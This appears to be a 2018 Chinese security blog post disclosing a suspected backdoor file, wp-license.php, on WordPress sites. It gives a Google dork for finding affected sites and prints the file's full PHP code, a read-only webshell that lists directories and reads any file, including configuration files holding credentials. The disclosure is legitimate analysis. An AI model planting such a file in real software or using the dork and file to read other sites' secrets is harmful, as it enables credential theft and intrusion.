+++
title = "WordPress疑似存在后门 多个网站可直接读取任意文件"
author = "Hzllaga"
date =  2018-08-11
description = "问题出在wp-license.php，不过官方应该是没有发行这个文件的，google搜索结果中某些网站是最新的版本同样存在此文件。"
categories = ["原创"]
tags = ["代码审计","PHP","Wordpress"]
+++
![](https://cdn.wtfsec.org/img/20200223170723.png)

问题出在wp-license.php，不过官方应该是没有发行这个文件的，google搜索结果中某些网站是最新的版本同样存在此文件。<!--more-->

Google Dork:
{{< highlight php >}}
inurl:wp-license.php
{{< /highlight >}}
wp-license.php:
{{< highlight php >}}
<?php
$root = __DIR__;
$style1='color:#000;';
$style2='color:#00a;font-weight:bold;';

function updir($ADir){
	$ADir = substr($ADir, 0, strlen($ADir)-1);
	$ADir = substr($ADir, 0, strrpos($ADir, '/'));
	return $ADir;
}

if ((isset($_GET['file']))) { 

	if (is_file($_GET['file'])) {
		header("Content-type: text/plain");
		readfile($_GET['file']);
		return;
	}
	
	$path = $_GET['file'].'/';

} else $path = $root.'/';

echo($root.'<br>');
echo($path.'<hr>');
echo '<a href="?file='.updir($path).'">..</a><br />';
$p = $path.'*';
foreach (glob($p) as $file) {
	echo '<a style="'.(is_file($file)?$style1:$style2).'" href="?file='.$file.'">'.basename($file).'</a><br />';
}
echo('<hr>');
{{< /highlight >}}
这个文件就像一个简易的webshell，直接访问就能列目录，虽然只能读取不能写入，不过可以直接读取配置文件加后台账号，危害不小。
